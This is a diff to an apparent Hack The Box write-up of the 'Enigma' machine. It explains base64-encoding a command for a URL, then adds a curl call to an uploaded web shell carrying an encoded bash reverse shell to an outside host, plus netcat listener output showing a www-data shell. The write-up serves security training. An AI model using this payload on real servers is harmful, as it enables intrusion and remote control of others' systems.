@@ -1096,6 +1096,22 @@ Even if the URL survived intact, the shell on the server side might misinterpret
 **Base64 sidesteps both problems entirely** because the base64 character set only uses letters, numbers, `+`, `/`, and `=` — and `--data-urlencode` handles those safely. The encoded string travels as a clean, unambiguous blob, and the decoding (`base64 -d | bash`) happens entirely on the server side after it arrives, where the special characters are no longer inside a URL.
 
 Think of it like putting a letter in an envelope — the envelope (base64) travels safely through the postal system (HTTP), and only gets opened (decoded) once it reaches its destination (the server).
+
+```shell
+┌──(kali㉿kali)-[~/…/HTB/Machines/SN11/Enigma]
+└─$ curl --get --data-urlencode "c=echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4yMjcvODAgMD4mMQo=|base64 -d|bash" \
+"http://support_001.enigma.htb/files/SHELL.php"
+```
+
+```shell
+┌──(kali㉿kali)-[~/…/HTB/Machines/SN11/Enigma]
+└─$ nc -lvnp 80  
+listening on [any] 80 ...
+connect to [10.10.15.227] from (UNKNOWN) [10.129.33.26] 59068
+bash: cannot set terminal process group (1529): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@enigma:~/html/openstamanager/files$ 
+```
 <div align="center">
 <br>
 <br>
